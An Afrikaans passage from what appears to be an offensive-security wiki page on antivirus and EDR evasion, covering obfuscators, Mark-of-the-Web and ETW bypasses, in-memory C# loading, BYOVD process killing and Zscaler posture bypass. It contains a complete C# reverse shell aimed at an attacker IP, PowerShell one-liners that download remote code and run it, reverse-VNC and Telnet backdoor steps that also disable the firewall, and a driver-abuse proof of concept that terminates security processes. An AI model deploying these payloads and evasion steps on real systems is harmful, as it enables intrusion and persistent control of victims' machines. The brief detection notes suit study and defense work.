4.  Handmatige opruiming – voer die resulterende binêre lêer onder dnSpy uit en soek na groot Base64-blokke of die gebruik van `RijndaelManaged`/`TripleDESCryptoServiceProvider` om die *werklike* payload op te spoor.  Die malware stoor dit dikwels as 'n TLV-geënkodeerde byte-skikking wat binne `<Module>.byte_0` geïnisialiseer word.

Die ketting herstel die uitvoeringsvloei **sonder** dat die kwaadwillige sample uitgevoer hoef te word – nuttig wanneer jy op 'n vanlyn werkstasie werk.

> 🛈  ConfuserEx produseer 'n pasgemaakte attribuut genaamd `ConfusedByAttribute` wat as 'n IOC gebruik kan word om samples outomaties te triageer.

#### Eenreël-opdrag
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om ’n oopbron-fork van die [LLVM](http://www.llvm.org/)-samestellingsuite te bied wat verhoogde sagtewaresekuriteit deur [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en peuterbeskerming moontlik maak.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe die `C++11/14`-taal gebruik kan word om tydens samestelling geobfuskeerde kode te genereer, sonder enige eksterne hulpmiddel en sonder om die samesteller te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg ’n laag geobfuskeerde bewerkings by wat deur die C++-template-metaprogrammeringsraamwerk gegenereer word. Dit maak die lewe van iemand wat die toepassing wil kraak ’n bietjie moeiliker.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is ’n x64-binêre obfuscator wat verskeie PE-lêers kan obfuskeer, insluitend: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is ’n eenvoudige metamorfiese kode-enjin vir arbitrêre uitvoerbare lêers.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is ’n fynkorrelige kode-obfuskasieraamwerk vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuskeer ’n program op samestellingskod vlak deur gewone instruksies in ROP-kettings om te skakel, wat ons natuurlike begrip van normale beheervloei verydel.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is ’n .NET PE Crypter wat in Nim geskryf is
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL na shellcode omskakel en dit dan laai

### LLVM-samestellerondersteunde selfmaskering per funksie

In plaas daarvan om ’n hele implantaat net te masker terwyl dit slaap, kan ’n gewysigde LLVM X86-backend geselekteerde funksies XOR-masker wanneer hulle onaktief is. Die Function Peekaboo PoC kies gedemanglede name wat `REG_` bevat, voeg posisie-onafhanklike entry-/exit-stubs om die finale masjienkode in, en skryf een gedeelde maskeringshandler in `.text`; handtekeninge op bronkodelvlak en die Windows x64-aanroepkonvensie bly onveranderd.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend-beheervloeitransformasie

Dit hoort ná instruksiekeuse en optimalisering, omdat die transformasie **elke gegenereerde return** moet dek en die presiese x86-uitleg moet ken. ’n Vooraf-uitvoer-`MachineFunctionPass` vind die laaste `MachineInstr::isReturn()`, verwyder dit sodat die finale pad in die aangehegte epiloog invloei, en vervang vroeëre returns met `JMP_1 handler`. Behou enige samestellergegenereerde stack-/frame-afbreekkode voor elke return; herlei slegs die return-instruksie self.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` en `emitFunctionBodyEnd()` skryf die stubs per funksie, terwyl `emitEndOfAsmFile()` die handler skryf. Simbole wat tussen uitvoerstadia gedeel word, laat ’n proloogvertakking toe om na sy latere epiloog te teiken; skryf vir ’n handmatig uitgevoerde naby-`je` `0F 84`, gevolg deur die viergreep-MC-uitdrukking `target - address_after_je`. Aanroepe en spronge na die handler kan eerder as `MCInst`-objekte uitgevoer word (`CALL64pcrel32` en `JMP_1`). ’n Pass moet `false` teruggee vir ’n ongeselekteerde funksie wanneer dit niks verander het nie; die PoC gee verkeerdelik `true` terug op daardie pad.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata en voor-CRT-inisialisering

Die PoC plaas ’n XOR-sleutel en 16-greep-rekords met ’n loader-herlokeerde funksiewyser plus ’n looptydlengte in `.funcmeta`. Hoewel die C-veld ’n `uint32_t` is, kry die handler toegang tot ’n QWORD by rekordoffset `+8`, wat die lengte en sy padding verbruik, en beweeg rekords met `0x10` aan. PE-seksiename is net agt grepe lank, dus sien die looptydopsoek `.funcmet`. ’n Eksterne patcher voeg ’n uitvoerbare `.stub` by, stoor die ou entry-point-RVA in die stub en herlei `AddressOfEntryPoint`; die PIC-stub kry die beeldbasis van `gs:[0x60]` → `[PEB+0x10]`, deurloop PE32+-invoere om ’n reeds ingevoerde `VirtualProtect` op te spoor, en loop voor die CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Inisialisering stel ’n sentinel in `gs:[0xE8]` en roep elke metadata-funksie aan. Die permanent leesbare proloog teken die funksiebegin in `gs:[0xF0]` aan, bespeur die sentinel en slaan die liggaam oor terwyl dit nog onversleuteld is. Die epiloog gebruik dan `call handler`; nadat die handler 13 registers (`0x68` grepe) gestoor het, is die return-adres by `[rsp+0x68]` die einde van die getransformeerde funksie, sodat `end - start` na sy metadata-rekord geskryf kan word. Die stub maak die sentinel skoon en spring na `ImageBase + original_entry_point_RVA` nadat al die liggame gemasker is.<sup>[[38]](#references)[[39]](#references)</sup>

Tydens ’n normale aanroep roep die proloog dieselfde simmetriese handler aan om die liggaam te dekodeer. Die finale pad vloei in die aangehegte epiloog in, terwyl elke vroeëre return reguit na die gedeelde handler spring. Die normale epiloog gebruik ook `jmp handler` eerder as `call`, sodat die handler se `ret` die oorspronklike oproeper se return-adres verbruik nadat dit weer gemasker het, en die funksieresultaat in `RAX` behoue bly.<sup>[[38]](#references)[[39]](#references)</sup>

#### Maskeringsprimitief en ontledingsaanwysers

Die handler vind die huidige rekord, slaan die vaste sigbare proloog oor (`0x46` grepe in hierdie bou), verander die res na `PAGE_EXECUTE_READWRITE`, XOR dit byte vir byte met die lae sleutelgreep, en stel dit dan op `PAGE_EXECUTE_READ`. Dieselfde lus dekodeer dus tydens invoer en enkodeer by elke normale uitgang.<sup>[[38]](#references)[[39]](#references)</sup>

Aanwysers met ’n hoë seinwaarde vir hierdie ontwerp sluit in:<sup>[[38]](#references)[[39]](#references)</sup>

- ’n entry point binne ’n uitvoerbare `.stub` en ’n `.funcmet`-seksie met ’n sleutel plus herlokeerde `.text`-wysers;
- PEB-, invoertabel- en seksietabelontleding voor die CRT, gevolg deur aanroepe deur elke metadata-wyser;
- identiese PIC-prologe met `call`/`pop` en baie return-plekke wat na een handler herlei word;
- skrywes na `gs:[0xE8]`, `gs:[0xF0]` en `gs:[0xF8]`, gevolg deur herhaalde `VirtualProtect`-oorgange en byte-vir-byte XOR-skrywes na beeldgesteunde uitvoerbare bladsye.

Dit is ontduiking van geheueskandeerders, nie kriptografiese beskerming nie: die gepatchde lêer bevat steeds die oorspronklike onversleutelde liggaam, en ’n debugger kan by `VirtualProtect` of die XOR-lus breek en die aktiewe funksie uitdump. Die enklaag-XOR, leesbare metadata en vaste `0x46`-grens maak ook vanlyn herstel eenvoudig.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Die PoC se TEB-gleuwe is thread-local, maar die gewysigde kodebladsye is proseswyd. Gelyktydige of rekursiewe toegang kan dus instruksies weer omskakel terwyl ’n ander aanroep loop; uitsonderings en nie-plaaslike uitgange kan ook herkoderings omseil. ’n Robuuste implementering moet oorgange sinkroniseer, die beskerming herstel wat werklik via `lpflOldProtect` teruggegee is, hardgekodeerde stub-lengtes vermy, beide `call`- en `jmp`-paaie vir x64-stackbelyning nagaan, en `FlushInstructionCache` aanroep nadat uitvoerbare grepe herskryf is. Microsoft stel uitdruklik die verantwoordelikheid vir instruksiekas-samehang op die oproeper wanneer uitvoerbare kode gewysig word.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Jy het dalk hierdie skerm gesien wanneer jy sommige uitvoerbare lêers van die internet aflaai en uitvoer.

Microsoft Defender SmartScreen is ’n sekuriteitsmeganisme wat bedoel is om eindgebruikers te beskerm teen die uitvoer van potensieel kwaadwillige toepassings.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik op ’n reputasiegebaseerde manier, wat beteken dat toepassings wat selde afgelaai word SmartScreen sal aktiveer, en sodoende die eindgebruiker waarsku en verhoed om die lêer uit te voer (alhoewel die lêer steeds uitgevoer kan word deur More Info -> Run anyway te klik).

**MoTW** (Mark of The Web) is ’n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier, wat outomaties geskep word wanneer lêers van die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir ’n lêer wat van die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om daarop te let dat uitvoerbare lêers wat met ’n **trusted** ondertekeningsertifikaat onderteken is **nie SmartScreen sal aktiveer nie**.

’n Baie doeltreffende manier om te keer dat jou payloads die Mark of The Web kry, is om hulle in ’n soort houer soos ’n ISO te verpak. Dit werk omdat Mark-of-the-Web (MOTW) **nie** op **nie-NTFS**-volumes toegepas kan word nie.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is ’n hulpmiddel wat payloads in uitvoerhouers verpak om Mark-of-the-Web te ontduik.

Voorbeeldgebruik:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hier is ’n demo vir die omseiling van SmartScreen deur payloads in ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is ’n kragtige loggingmeganisme in Windows wat toepassings en stelselkomponente toelaat om **gebeurtenisse te log**. Sekuriteitsprodukte kan dit egter ook gebruik om kwaadwillige aktiwiteite te monitor en op te spoor.

Net soos AMSI gedeaktiveer (omseil) word, is dit ook moontlik om die **`EtwEventWrite`**-funksie van die gebruiker-ruimte-proses onmiddellik te laat terugkeer sonder om enige gebeurtenisse te log. Dit word gedoen deur die funksie in die geheue te lap om onmiddellik terug te keer, wat ETW-logging vir daardie proses effektief deaktiveer.

Jy kan meer inligting vind by **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) en [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Die laai van C#-binaries in die geheue is al lank bekend en is steeds ’n uitstekende manier om jou post-exploitation-gereedskap uit te voer sonder om deur AV opgespoor te word.

Aangesien die payload direk in die geheue gelaai word sonder om aan die skyf te raak, hoef ons net bekommerd te wees oor die lap van AMSI vir die hele proses.

Die meeste C2-frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C#-assemblies direk in die geheue uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels **die skep van ’n nuwe weggooiproses**, die inspuiting van jou kwaadwillige post-exploitation-kode in daardie nuwe proses, die uitvoering van jou kwaadwillige kode en, wanneer dit klaar is, die beëindiging van die nuwe proses. Dit hou voordele sowel as nadele in. Die voordeel van die fork and run-metode is dat uitvoering **buite** ons Beacon-implantproses plaasvind. Dit beteken dat indien iets verkeerd loop tydens ons post-exploitation-aksie of ons uitgevang word, daar ’n **veel groter kans** is dat ons **implant oorleef.** Die nadeel is dat daar ’n **groter kans** is dat jy deur **Gedragsopsporing** uitgevang word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit behels dat die kwaadwillige post-exploitation-kode **in sy eie proses** ingespuit word. Só kan jy vermy om ’n nuwe proses te skep en dit deur AV te laat skandeer, maar die nadeel is dat indien iets verkeerd loop wanneer jou payload uitgevoer word, daar ’n **veel groter kans** is dat jy jou **beacon verloor**, aangesien dit kan omval.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer wil lees oor die laai van C#-assemblies, kyk gerus na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C#-assemblies **van PowerShell af** laai. Kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t se video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Gebruik van Ander Programmeertale

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode met ander tale uit te voer deur die gekompromitteerde masjien toegang te gee **tot die interpreter-omgewing wat op die Aanvaller-Beheerde SMB-share geïnstalleer is**.

Deur toegang tot die Interpreter Binaries en die omgewing op die SMB-share toe te laat, kan jy **willekeurige kode in hierdie tale binne die geheue** van die gekompromitteerde masjien uitvoer.

Die repo meld: Defender skandeer steeds die scripts, maar deur Go, Java, PHP, ens. te gebruik, het ons **meer buigsaamheid om statiese handtekeninge te omseil**. Toetse met ewekansige, nie-verdoeselde reverse-shell-scripts in hierdie tale was suksesvol.

## TokenStomping

Token stomping manipuleer die access token van ’n sekuriteitsproduk soos ’n EDR of AV. Deur die token se voorregte te verminder, kan die proses aan die gang bly terwyl dit verhinder word om bevoorregte inspeksie- of herstelaksies uit te voer.

Om dit te voorkom, kan Windows **eksterne prosesse verhinder** om handles na die tokens van sekuriteitsprosesse te kry.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Gebruik van Betroubare Sagteware

### Chrome Remote Desktop

Soos beskryf in [**hierdie blogplasing**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), is dit maklik om Chrome Remote Desktop op ’n slagoffer se rekenaar te installeer en dit dan te gebruik om beheer daaroor oor te neem en volharding te behou:<sup>[[35]](#references)</sup>
1. Laai dit af vanaf https://remotedesktop.google.com/, klik op "Set up via SSH", en klik dan op die MSI-lêer vir Windows om die MSI-lêer af te laai.
2. Laat die installeerder stilweg op die slagoffer se masjien loop (administrateurtoegang word vereis): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gaan terug na die Chrome Remote Desktop-bladsy en klik op next. Die towenaar sal jou dan vra om te magtig; klik op die Authorize-knoppie om voort te gaan.
4. Voer die verskafte opdrag met die vereiste aanpassings uit: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (die `--pin`-parameter stel die PIN sonder om die GUI te gebruik).
 

## Gevorderde Ontduiking

Ontduiking is ’n baie ingewikkelde onderwerp. Soms moet jy baie verskillende bronne van telemetrie in ’n enkele stelsel in ag neem, so dit is byna onmoontlik om in volwasse omgewings heeltemal onopgespoor te bly.

Elke omgewing waarteen jy te staan kom, sal sy eie sterk- en swakpunte hê.

Ek moedig jou sterk aan om hierdie praatjie deur [@ATTL4S](https://twitter.com/DaniLJ94) te kyk om ’n vastrapplek in meer gevorderde ontduikingstegnieke te kry.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dit is ook nog ’n uitstekende praatjie deur [@mariuszbit](https://twitter.com/mariuszbit) oor ontduiking in diepte.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Ou Tegnieke**

### **Kontroleer watter dele Defender as kwaadwillig beskou**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik, wat **dele van die binary verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig beskou, en dit dan vir jou afsonder.\
Nog ’n hulpmiddel wat **dieselfde doen, is** [**avred**](https://github.com/dobin/avred), met ’n openbare webdiens by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Tot en met Windows10 het alle Windows-weergawes ’n **Telnet server** ingesluit wat jy kon installeer (as administrateur) deur die volgende uit te voer:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Laat dit **begin** wanneer die stelsel aangeskakel word en **voer** dit nou uit:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Verander telnet-poort** (stealth) en deaktiveer firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Laai dit af van: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin-aflaaie hê, nie die installasieprogram nie)

**OP DIE GASHEER**: Voer _**winvnc.exe**_ uit en stel die bediener op:

- Aktiveer die opsie _Disable TrayIcon_
- Stel ’n wagwoord in _VNC Password_
- Stel ’n wagwoord in _View-Only Password_

Skuif dan die binêre lêer _**winvnc.exe**_ en die **nuut** geskepte lêer _**UltraVNC.ini**_ na die **slagoffer**

#### **Terugverbinding**

Die **aanvaller** moet die binêre lêer `vncviewer.exe -listen 5900` **op sy gasheer uitvoer**, sodat dit **gereed sal wees** om ’n omgekeerde **VNC-verbinding** te ontvang. Begin dan binne die **slagoffer** die winvnc-daemon met `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit

**WAARSKUWING:** Om ongemerk te bly, moet jy ’n paar dinge nie doen nie

- Moenie `winvnc` begin as dit reeds loop nie, anders sal jy ’n [opspringvenster](https://i.imgur.com/1SROTTl.png) veroorsaak. Kyk of dit loop met `tasklist | findstr winvnc`
- Moenie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie, anders sal [die konfigurasievenster](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moenie `winvnc -h` vir hulp uitvoer nie, anders sal jy ’n [opspringvenster](https://i.imgur.com/oc18wcu.png) veroorsaak

### GreatSCT

Laai dit af van: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Binne GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Begin nou **die lister** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Huidige Defender sal die proses baie vinnig beëindig.**

### Ons eie reverse shell saamstel

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Stel dit saam met:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Gebruik dit met:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# met behulp van compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lys van C#-obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik van python vir 'n voorbeeld van die bou van injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander nutsmiddels

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR doodmaak vanuit Kernel Space

Storm-2603 het ’n klein konsolehulpmiddel, bekend as **Antivirus Terminator**, gebruik om endpoint-beskerming te deaktiveer voordat ransomware afgelaai word. Die hulpmiddel bring sy **eie kwesbare maar *getekende* driver** saam en misbruik dit om bevoorregte kernel-bewerkings uit te voer wat selfs AV-dienste met Protected-Process-Light (PPL) nie kan keer nie.<sup>[[12]](#references)</sup>

Belangrike punte
1. **Getekende driver**: Die lêer wat na die skyf geskryf word, is `ServiceMouse.sys`, maar die binêre lêer is die wettig getekende driver `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die driver ’n geldige Microsoft-handtekening het, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) geaktiveer is.
2. **Diensinstallasie**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Die eerste reël registreer die drywer as ’n **kerndiens**, en die tweede begin dit sodat `\\.\ServiceMouse` vanuit gebruikersruimte toeganklik word.
3. **IOCTL’s wat deur die drywer blootgestel word**
   | IOCTL-kode | Vermoë                                  |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Beëindig ’n arbitrêre proses volgens PID (word gebruik om Defender/EDR-dienste te beëindig) |
   | `0x990000D0` | Vee ’n arbitrêre lêer op die skyf uit |
   | `0x990001D0` | Ontlaai die drywer en verwyder die diens |

   Minimale C-bewys-van-konsep:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Waarom dit werk**:  BYOVD omseil user-mode-beskermings heeltemal; kode wat in die kernel uitgevoer word, kan *beskermde* prosesse oopmaak, beëindig of met kernel-objekte peuter, ongeag PPL/PP, ELAM of ander hardening-funksies.

Opsporing / Versagting
•  Aktiveer Microsoft se kwesbarebestuurder-bloklys (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laai.
•  Monitor die skepping van nuwe *kernel*-dienste en waarsku wanneer ’n bestuurder vanaf ’n world-writable-gids gelaai word of nie op die allow-list voorkom nie.
•  Monitor user-mode-handles na pasgemaakte device-objekte, gevolg deur verdagte `DeviceIoControl`-oproepe.

### Om Zscaler Client Connector se Posture Checks te omseil via binêre pleistering op skyf

Zscaler se **Client Connector** pas toestelpostuurreëls plaaslik toe en maak staat op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpkeuses maak ’n volledige omseiling moontlik:

1. Postuurevaluering vind **geheel en al aan die kliëntkant** plaas (’n boolean word na die bediener gestuur).
2. Interne RPC-eindpunte valideer slegs dat die uitvoerbare lêer wat koppel **deur Zscaler onderteken is** (via `WinVerifyTrust`).<sup>[[11]](#references)</sup>

